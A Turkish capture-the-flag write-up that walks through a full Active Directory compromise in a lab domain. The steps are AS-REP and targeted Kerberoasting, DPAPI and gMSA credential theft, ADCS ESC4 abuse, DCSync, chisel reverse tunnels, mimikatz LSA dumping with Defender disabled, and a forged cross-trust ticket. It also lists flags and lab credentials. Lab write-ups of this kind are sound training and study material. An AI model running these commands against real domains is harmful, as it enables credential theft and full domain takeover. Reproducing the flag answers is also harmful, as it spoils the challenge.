# SkyDays CTF — Tam Writeup

## Flagler

| Flag | Değer | Puan |
|------|-------|------|
| FLAG 1 | `SKYDAYS{asrep_r0ast_1n1t1al_acc3ss}` | 100 |
| FLAG 2 | `SKYDAYS{psaf3_cr4ck_h0p_t0_hr}` | 200 |
| FLAG 3 | `SKYDAYS{k3rb3r0ast_dap1_r3g1stry}` | 300 |
| FLAG 4 | `SKYDAYS{esc4_dcs_ync_d0ma1n_0wn3d}` | 400 |
| root.txt | `SKYDAYS{g0ld3n_t1ck3t_s1d_f1lt3r_bdc01_pwn3d}` | 500 |

---

## Ortam

```
DC01  : 10.10.10.10 — skydays.ctf
BDC01 : 10.10.10.30 — backup.skydays.ctf (direkt erişim YOK)
Trust : One-way Outbound (skydays → backup), SID Filtering aktif
```

---

## Genel Attack Chain

```
RECON
  └─► nmap → LDAP anonymous → e.beylik keşfi (trick)
        └─► AS-REP Roast → Princess#1
              └─► SMB IT_Share → backup.ps1 → Deploy_Share → ZIP → psafe3
                    └─► n.erdem:Big#3776 [FLAG 2]
                          └─► BloodHound → ForceChangePassword → a.demirelli [FLAG 3]
                                └─► GenericWrite → Targeted Kerberoast → svc_backup:JONAthan25!*
                                      └─► AddSelf → Backup_Operators_Custom → DPAPI → svc_adcs
                                            └─► ReadGMSAPassword → gmsa_svc$
                                                  └─► WriteDacl → ESC4 → DA cert → NT hash [FLAG 4]
                                                        └─► DCSync → krbtgt → Trust Ticket → BDC01
                                                              └─► LSA bypass → krbtgt → arşiv şifresi → root.txt [FLAG 5]
```

---

## ADIM 1 — Recon

### 1.1 Port Tarama

```bash
nmap -p- --min-rate 10000 10.10.10.10
nmap -sCV -p 53,88,135,389,445,636,3268,3269,5985,9389 10.10.10.10
```

**Çıktıda dikkat:**
- Domain: `skydays.ctf`
- Hostname: `DC01`
- SMB Signing: Required

### 1.2 Hosts Dosyası Güncelle

```bash
echo "10.10.10.10  DC01.skydays.ctf skydays.ctf DC01" | sudo tee -a /etc/hosts
```

### 1.3 SMB Null Session

```bash
netexec smb 10.10.10.10 -u '' -p '' --shares
```

> **Not:** Share isimleri görünür ama içerik anonim erişilemez. Yetkilendirme gerekli.

---

## ADIM 2 — LDAP Enumeration (Trick!)

### 2.1 Standart LDAP — Kullanıcı Listesi

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "DC=skydays,DC=ctf" \
    "(objectClass=user)" sAMAccountName 2>/dev/null | grep "sAMAccountName:"
```

> **🎯 TRICK:** `e.beylik` kullanıcısı standart sorguda **görünmez!**
> Sistemde `SystemAccounts` adlı gizli bir OU var.

### 2.2 Tüm Attribute'ları Çek — İpucu Bul

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "DC=skydays,DC=ctf" \
    "(objectClass=user)" sAMAccountName info 2>/dev/null | \
    grep -E "sAMAccountName:|info:"
```

**Çıktıda:**
```
sAMAccountName: k.yilmaz
info: New employee onboarding access requests are handled by the SystemAccounts team...

sAMAccountName: helpdesk
info: Default credentials (base64): SDNscGQzc2shMjAyNA==
```

### 2.3 Base64 Decode

```bash
echo "SDNscGQzc2shMjAyNA==" | base64 -d
# H3lpd3sk!2024
```

### 2.4 helpdesk ile SystemAccounts OU Sorgula

```bash
cat > /tmp/ldap_query.sh << 'EOF'
#!/bin/bash
ldapsearch -x -H ldap://10.10.10.10 \
    -D "helpdesk@skydays.ctf" \
    -w 'H3lpd3sk!2024' \
    -b "OU=SystemAccounts,OU=Corp,DC=skydays,DC=ctf" \
    "(objectClass=user)" sAMAccountName userAccountControl 2>/dev/null
EOF
bash /tmp/ldap_query.sh
```

**Çıktıda:**
```
sAMAccountName: e.beylik
userAccountControl: 4260352
```

> **🎯 TRICK:** `4260352 = 4194304 (DONT_REQUIRE_PREAUTH) + 512 + ...`
> Bu flag AS-REP Roast yapılabilir anlamına gelir!

---

## ADIM 3 — Initial Access: AS-REP Roast (FLAG 1)

### 3.1 Hash Al

```bash
impacket-getNPUsers skydays.ctf/e.beylik -dc-ip 10.10.10.10 -no-pass
```

### 3.2 Hash Kır

```bash
echo '$krb5asrep$23$e.beylik@SKYDAYS.CTF:HASH...' > /tmp/ebeylik.hash
hashcat -m 18200 /tmp/ebeylik.hash /usr/share/wordlists/rockyou.txt
# Princess#1
```

### 3.3 SMB Erişimi Doğrula

```bash
netexec smb 10.10.10.10 -u e.beylik -p 'Princess#1' --shares
```

### 3.4 IT_Share'den Dosyaları İndir

```bash
smbclient //10.10.10.10/IT_Share -U 'skydays.ctf/e.beylik%Princess#1' \
    -c "get backup.ps1; get corp_accounts.zip"

cat backup.ps1
# → Deploy_Share'e işaret ediyor

smbclient //10.10.10.10/Deploy_Share -U 'skydays.ctf/e.beylik%Princess#1' \
    -c "get deploy_notes.txt"

cat deploy_notes.txt
# → ZIP şifresi: Sk1D@ys2024!
```

### 3.5 FLAG 1

```bash
smbclient //10.10.10.10/IT_Share -U 'skydays.ctf/e.beylik%Princess#1' \
    -c "cd e.beylik; ls; get flag1.txt"
cat flag1.txt
# SKYDAYS{asrep_r0ast_1n1t1al_acc3ss}
```

---

## ADIM 4 — Lateral Movement: psafe3 → n.erdem (FLAG 2)

### 4.1 ZIP Aç

```bash
7z x corp_accounts.zip -pSk1D@ys2024!
# accounts.psafe3 çıkar
```

### 4.2 Master Şifre Kır

```bash
pwsafe2john accounts.psafe3 > psafe3.hash
john psafe3.hash --wordlist=/usr/share/wordlists/rockyou.txt
# Hottie#1
```

### 4.3 psafe3 İçeriği

Password Safe GUI ile açınca:
```
Username: n.erdem
Password: Big#3776
```

### 4.4 FLAG 2

```bash
netexec smb 10.10.10.10 -u n.erdem -p 'Big#3776' --shares
evil-winrm -i 10.10.10.10 -u n.erdem -p 'Big#3776'
# type C:\Users\n.erdem\Desktop\flag2.txt
# SKYDAYS{psaf3_cr4ck_h0p_t0_hr}
```

---

## ADIM 5 — BloodHound & Privilege Escalation (FLAG 3)

### 5.1 BloodHound Veri Toplama

```bash
bloodhound-python -u n.erdem -p 'Big#3776' \
    -d skydays.ctf -dc DC01.skydays.ctf \
    -c All --zip -ns 10.10.10.10
```

### 5.2 BloodHound'da Keşif

```
n.erdem → ForceChangePassword → a.demirelli
a.demirelli → GenericWrite → svc_backup
svc_backup → AddSelf → Backup_Operators_Custom
svc_adcs → ReadGMSAPassword → gmsa_svc$
gmsa_svc$ → WriteDacl → CorpUserCert [BloodHound'da GİZLİ!]
```

### 5.3 Hop 1: ForceChangePassword → a.demirelli

```bash
bloodyAD -u n.erdem -p 'Big#3776' -d skydays.ctf \
    --host DC01.skydays.ctf --dc-ip 10.10.10.10 \
    set password a.demirelli 'NewPass123!'
```

> **🎯 TRICK:** `a.demirelli` **Protected Users** grubunda!
> NTLM çalışmaz, Kerberos kullanmak zorundasın.
> Ayrıca WinRM sadece localhost'tan erişilebilir — **Chisel pivot** gerekli!

### 5.4 a.demirelli için Kerberos TGT Al

```bash
impacket-getTGT skydays.ctf/a.demirelli:'NewPass123!' -dc-ip 10.10.10.10
export KRB5CCNAME=./a.demirelli.ccache
```

### 5.5 Chisel Pivot Kur

```bash
# Kali'de
sudo chisel server -p 9999 --reverse
```

```powershell
# DC01 n.erdem WinRM oturumunda
# Önce HR_Sandbox klasörü Defender exclusion'a alınmış — chisel buraya yükle
upload /usr/share/windows-resources/chisel/chisel_windows.exe C:\HR_Sandbox\chisel.exe
C:\HR_Sandbox\chisel.exe client 10.10.10.20:9999 R:5985:127.0.0.1:5985
```

> **🎯 TRICK:** `C:\HR_Sandbox` → HR departmanı için AV exclusion klasörü.
> README.txt'de şunlar yazar: "Excluded from antivirus scanning - IT Security Ticket #4892"
> Chisel'i buraya yükle, Defender engellemez.

```bash
# /etc/hosts güncelle
echo "127.0.0.1 dc01-local.skydays.ctf" | sudo tee -a /etc/hosts

# Kerberos ile a.demirelli bağlan
evil-winrm -i dc01-local.skydays.ctf -u a.demirelli -r SKYDAYS.CTF
```

### 5.6 FLAG 3

```powershell
type C:\Users\a.demirelli\Desktop\flag3.txt
# SKYDAYS{k3rb3r0ast_dap1_r3g1stry}
```

---

## ADIM 6 — Targeted Kerberoast → svc_backup

### 6.1 GenericWrite ile SPN Ekle

```bash
bloodyAD -u a.demirelli -d skydays.ctf \
    --host DC01.skydays.ctf --dc-ip 10.10.10.10 \
    -k set object svc_backup servicePrincipalName \
    -v "backup/dc01.skydays.ctf"
```

### 6.2 Targeted Kerberoast

```bash
impacket-getTGT skydays.ctf/a.demirelli:'NewPass123!' -dc-ip 10.10.10.10
export KRB5CCNAME=./a.demirelli.ccache

python3 /tmp/targetedKerberoast.py -k -d skydays.ctf \
    --dc-ip 10.10.10.10 --request-user svc_backup
```

### 6.3 Hash Kır

```bash
hashcat -m 13100 svc_backup.hash /usr/share/wordlists/rockyou.txt
# JONAthan25!*
```

---

## ADIM 7 — DPAPI → svc_adcs Kimliği

### 7.1 AddSelf ile Gruba Ekle

```bash
bloodyAD -u svc_backup -p 'JONAthan25!*' -d skydays.ctf \
    --host DC01.skydays.ctf --dc-ip 10.10.10.10 \
    add groupMember Backup_Operators_Custom svc_backup
```

> **🎯 TRICK:** `Backup_Operators_Custom` grubuna eklenince WinRM açılıyor!
> Grup `Remote Management Users`'a dahil edilmiş.
> Ama **2 dakika** içinde restore script bunu geri alır.
> **Hızlı hareket et!**

### 7.2 Hemen WinRM Bağlan

```bash
evil-winrm -i 10.10.10.10 -u svc_backup -p 'JONAthan25!*'
```

### 7.3 DPAPI Dosyalarını İndir

```powershell
cd C:\Backup\Credentials
dir
# credential.blob ve masterkey dosyaları var
download credential.blob
download masterkey
```

### 7.4 DPAPI Çöz

```bash
# MasterKey çöz
impacket-dpapi masterkey \
    -file masterkey \
    -password 'JONAthan25!*' \
    -sid S-1-5-21-2612352700-2599720198-3840439994-1120

# Decrypted key ile credential çöz
impacket-dpapi credential \
    -file credential.blob \
    -key 0xDECRYPTED_KEY_BURAYA
```

**Çıktıda:**
```
Target  : Domain:target=dc01.skydays.ctf
Username: svc_adcs
Unknown : xK9#mP2vL!qR7
```

---

## ADIM 8 — ReadGMSAPassword → gmsa_svc$

### 8.1 svc_adcs WinRM Bağlan

```bash
evil-winrm -i 10.10.10.10 -u svc_adcs -p 'xK9#mP2vL!qR7'
```

> **🎯 İPUCU:** `C:\Users\svc_adcs\Desktop\notes.txt` dosyasına bak!
> ```
> [2024-09-15] CorpUserCert template review pending
>              Contact gmsa_svc service account for template management
> ```
> Bu seni ADCS'e ve gmsa_svc$'ye yönlendirir.

### 8.2 gMSA Şifresi Al

```bash
python3 /tmp/gMSADumper.py -u svc_adcs -p 'xK9#mP2vL!qR7' \
    -d skydays.ctf -l 10.10.10.10

# gmsa_svc$:::4238e8054a5719629eeca1d0c861b27c
```

---

# ADIM 9 — ESC4: WriteDacl → DCSync Pivot (FLAG 4)

> 🎯 **TRICK:** `gmsa_svc$` hesabı `CorpUserCert` template'inde **WriteDacl** yetkisine sahip. Bu durum BloodHound'da görünmeyebilir, manuel keşif kritiktir. Ayrıca hedef DC'de **PKINIT kapalı** olduğu için sertifika üzerinden doğrudan NT Hash alınamaz; sertifika LDAPS üzerinden kullanılarak DCSync yetkisi tanımlanmalıdır.

---

## 9.1 Zafiyet Tarama

```bash
certipy-ad find \
    -u 'gmsa_svc$@skydays.ctf' \
    -hashes ':4238e8054a5719629eeca1d0c861b27c' \
    -dc-ip 10.10.10.10 \
    -target DC01.skydays.ctf \
    -vulnerable -stdout
```

**Bulgu:** `ESC4: User has dangerous permissions` (Principal: `gmsa_svc$`)

---

## 9.2 ESC4 Saldırısı ve Sertifika Talebi

### TGT Al ve Oturumu Hazırla

```bash
impacket-getTGT 'skydays.ctf/gmsa_svc$' -hashes ':4238e8054a5719629eeca1d0c861b27c' -dc-ip 10.10.10.10
export KRB5CCNAME='./gmsa_svc$.ccache'
```

### Adım 1: Template Konfigürasyonunu Değiştir (`EnrolleeSuppliesSubject = 1`)

```bash
bloodyAD -u 'gmsa_svc$@skydays.ctf' -d skydays.ctf --host DC01.skydays.ctf --dc-ip 10.10.10.10 -k set object \
    "CN=CorpUserCert,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=skydays,DC=ctf" \
    msPKI-Certificate-Name-Flag -v 1
```

### Adım 2: Administrator Adına Sertifika Talep Et

> ⏳ **Not:** CA refresh için ~65 saniye bekledikten sonra çalıştırın.

```bash
certipy-ad req \
    -u 'gmsa_svc$@skydays.ctf' -hashes ':4238e8054a5719629eeca1d0c861b27c' \
    -dc-ip 10.10.10.10 -target DC01.skydays.ctf \
    -ca skydays-CA -template CorpUserCert -upn administrator@skydays.ctf
```

---

## 9.3 DCSync Pivot (PKINIT Bypass)

Hedef DC PKINIT desteklemediği için `certipy-ad auth` başarısız olacaktır. Bu aşamada sertifikayı kullanarak `gmsa_svc$` hesabına **DCSync yetkisi** tanımlıyoruz.

### Adım 1: Sertifikayı Temizle ve Hazırla

```bash
# PFX'ten dosya çıkar (şifre boş)
openssl pkcs12 -in administrator.pfx -nocerts -out admin.key -nodes -passin pass:
openssl pkcs12 -in administrator.pfx -nokeys -out admin.crt -passin pass:

# Gereksiz attribute'ları temizle
sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' admin.crt > clean.crt
sed -n '/-----BEGIN PRIVATE KEY-----/,/-----END PRIVATE KEY-----/p' admin.key > clean.key
```

### Adım 2: LDAPS Üzerinden DCSync Yetkisi Tanımla

```bash
bloodyAD -d skydays.ctf -u 'administrator' -c 'clean.key:clean.crt' \
    --host DC01.skydays.ctf --dc-ip 10.10.10.10 add dcsync 'gmsa_svc$'
```

### Adım 3: Secretsdump ile NT Hash Çekme

Artık yetkili olan `gmsa_svc$` hesabı ile Administrator hash'ini çekiyoruz:

```bash
impacket-secretsdump 'skydays.ctf/gmsa_svc$@10.10.10.10' \
    -hashes ':4238e8054a5719629eeca1d0c861b27c' -just-dc-user administrator

# Administrator:500:aad3b435...:b1c9e39a927846156ae42de4a71349b2:::
```

---

## 9.4 FLAG 4 (Pwn)

```bash
evil-winrm -i 10.10.10.10 -u administrator -H 'b1c9e39a927846156ae42de4a71349b2'

# type C:\Users\Administrator\Desktop\flag4.txt
# SKYDAYS{esc4_dcs_ync_d0ma1n_0wn3d}
```

## ADIM 10 — BDC01: Trust Ticket & FLAG 5

### 10.1 İkinci Domain'i Keşfet

```powershell
# DC01 Administrator WinRM oturumunda
schtasks /query /fo LIST /v /tn "DomainBackupSync"
# Task To Run: ...BDC01.backup.skydays.ctf...
```

### 10.2 BDC01 Domain SID Al

```powershell
# DC01 WinRM oturumunda — şifre gerekmez
(Get-ADObject -Filter "objectClass -eq 'trustedDomain'" `
    -SearchBase "CN=System,DC=skydays,DC=ctf" `
    -Properties securityIdentifier).securityIdentifier.Value
# S-1-5-21-864093730-3672355038-1791949165
```

### 10.3 Chisel Pivot — BDC01 Portlarını Aç

```bash
# Kali'de
sudo chisel server -p 9999 --reverse
```

```powershell
# DC01 Administrator WinRM oturumunda
C:\HR_Sandbox\chisel.exe client 10.10.10.20:9999 `
    R:88:10.10.10.30:88 `
    R:389:10.10.10.30:389 `
    R:445:10.10.10.30:445 `
    R:5985:10.10.10.30:5985
```

```bash
# /etc/hosts güncelle
echo "127.0.0.1 BDC01.backup.skydays.ctf backup.skydays.ctf" | sudo tee -a /etc/hosts

# Bağlantı test
nc -zv 127.0.0.1 88
nc -zv 127.0.0.1 445
```

### 10.4 Trust Key Al

```bash
# DCSync ile BACKUP$ trust hesabı hash'i al
impacket-secretsdump \
    -hashes ':b1c9e39a927846156ae42de4a71349b2' \
    'skydays.ctf/administrator@10.10.10.10' \
    -just-dc-user 'BACKUP$' 2>/dev/null | grep "BACKUP\$:"
```

> **🎯 TRICK:** BACKUP$ hash trust key değildir!
> Gerçek trust key'i mimikatz ile almalısın:

```powershell
# DC01 Administrator WinRM oturumunda
# mimikatz C:\HR_Sandbox'ta mevcut (Defender exclusion)
C:\HR_Sandbox\mimikatz.exe "privilege::debug" "lsadump::trust /patch" "exit"
# rc4_hmac_nt: TRUST_KEY_BURAYA
```

### 10.5 krb5.conf Güncelle

```bash
sudo bash -c 'cat > /etc/krb5.conf << EOF
[libdefaults]
    default_realm = SKYDAYS.CTF
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false

[realms]
    SKYDAYS.CTF = {
        kdc = 10.10.10.10
    }
    BACKUP.SKYDAYS.CTF = {
        kdc = 127.0.0.1
    }

[domain_realm]
    .skydays.ctf = SKYDAYS.CTF
    skydays.ctf = SKYDAYS.CTF
    .backup.skydays.ctf = BACKUP.SKYDAYS.CTF
    backup.skydays.ctf = BACKUP.SKYDAYS.CTF
EOF'
```

> **🎯 TRICK:** `rdns = false` kritik!
> Ruby GSSAPI 127.0.0.1'i localhost olarak çözümler ve bileti reddeder.
> Bu satır olmadan evil-winrm çalışmaz.

### 10.6 Inter-Realm Ticket Oluştur

```bash
kdestroy 2>/dev/null

impacket-ticketer \
    -nthash TRUST_RC4_KEY \
    -domain skydays.ctf \
    -domain-sid S-1-5-21-2612352700-2599720198-3840439994 \
    -extra-sid S-1-5-21-864093730-3672355038-1791949165-519 \
    -spn krbtgt/backup.skydays.ctf \
    administrator

export KRB5CCNAME=administrator.ccache
```

### 10.7 BDC01'e Service Ticket Al ve Bağlan

```bash
# HTTP SPN ile ticket al
impacket-getST \
    -k -no-pass \
    -spn HTTP/BDC01.backup.skydays.ctf \
    -dc-ip 127.0.0.1 \
    'backup.skydays.ctf/administrator'

# KRB5CCNAME unset et — evil-winrm -K parametresini okusun
unset KRB5CCNAME

# BDC01'e bağlan
evil-winrm -i BDC01.backup.skydays.ctf -P 5985 \
    -r BACKUP.SKYDAYS.CTF \
    -K /home/kali/administrator@HTTP_BDC01.backup.skydays.ctf@BACKUP.SKYDAYS.CTF.ccache
```

> **🎯 TRICK:** BDC01'in saati farklı olabilir.
> `C:\Windows\debug\netlogon.log` dosyasına bak:
> ```
> [NETLOGON] Clock skew detected: +6 minutes from domain time
> ```
> Gerekirse `faketime '+6 minutes'` kullan.

### 10.8 LSA Bypass — BDC01 krbtgt Hash

```powershell
# BDC01'de Defender'ı devre dışı bırak
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableScriptScanning $true
```

```powershell
# Mimikatz yükle — C:\Backup\Tools exclusion klasörüne
upload /path/to/mimikatz.exe C:\Backup\Tools\mimikatz.exe
```

> **🎯 İPUCU:** `C:\Backup\Tools\README.txt` dosyası:
> ```
> LSA protection is enabled on this system.
> Use appropriate bypass techniques for memory analysis.
> Mimikatz driver (!+) may be required for LSA bypass.
> ```

```powershell
# LSA bypass ile krbtgt hash al
cd C:\Backup\Tools
.\mimikatz.exe "privilege::debug" "!+" "lsadump::lsa /patch" "exit"
# krbtgt NTLM: e82fe4003879cc304f982ff9f450b05c
```

### 10.9 Arşiv Şifresi Türet

> **🎯 İPUCU:** `C:\Scripts\backup_formula.ps1` dosyasını oku:
> ```
> Archive password = SHA256( krbtgt_NT_hash_bytes + UTF8("SKYDAYS2026") )
> ```

```python
import hashlib
krbtgt = bytes.fromhex('e82fe4003879cc304f982ff9f450b05c')
pw = hashlib.sha256(krbtgt + b'SKYDAYS2026').hexdigest()
print(pw)
# 1ed9b02294c38adff9c31afc7ab0c53ac61142e366fe7eda51b989a1ebcf3001
```

### 10.10 FLAG 5

```powershell
cd C:\Backup
& "C:\Program Files\7-Zip\7z.exe" e SKYDAYS_BACKUP_2026.7z `
    -p1ed9b02294c38adff9c31afc7ab0c53ac61142e366fe7eda51b989a1ebcf3001
type root.txt
# SKYDAYS{g0ld3n_t1ck3t_s1d_f1lt3r_bdc01_pwn3d}
```

---

## Tricks & Tuzaklar Özeti

| Adım | Trick/Tuzak | Çözüm |
|------|-------------|-------|
| LDAP | `e.beylik` standart LDAP'ta görünmez | `helpdesk` base64 creds → SystemAccounts OU |
| Initial Access | `e.beylik` kolay bulunmuyor | UAC flag (4194304) = DONT_REQUIRE_PREAUTH |
| a.demirelli | Protected Users → NTLM çalışmaz | Kerberos TGT + evil-winrm -r |
| a.demirelli | WinRM sadece localhost | n.erdem üzerinden chisel pivot |
| svc_backup | AddSelf → 3dk sonra restore | Hızlı hareket et! Hemen WinRM bağlan |
| Chisel | Defender engelliyor | `C:\HR_Sandbox` — AV exclusion |
| ESC4 | BloodHound'da görünmez | certipy-ad find ile gmsa_svc$ olarak tara |
| ESC4 | CA 60sn cache | Flag değiştirince 65sn bekle |
| Trust | SID Filtering aktif | Enterprise Admins SID (-519) ekle |
| BDC01 | rdns sorunu | krb5.conf'a `rdns = false` ekle |
| BDC01 | LSA Protection | `!+` driver yükle, mimikatz bypass |

---

## Notlar

- AD restore scripti her **3 dakikada** bir çalışır → şifreler, ACL'ler, ADCS template sıfırlanır
- HR_Sandbox ve BDC01 Tools klasörleri her **30 dakikada** temizlenir
- BDC01'e direkt IP erişimi yoktur — Chisel pivot zorunludur
- Trust ticket için `lsadump::trust /patch` ile gerçek trust key kullanılmalıdır
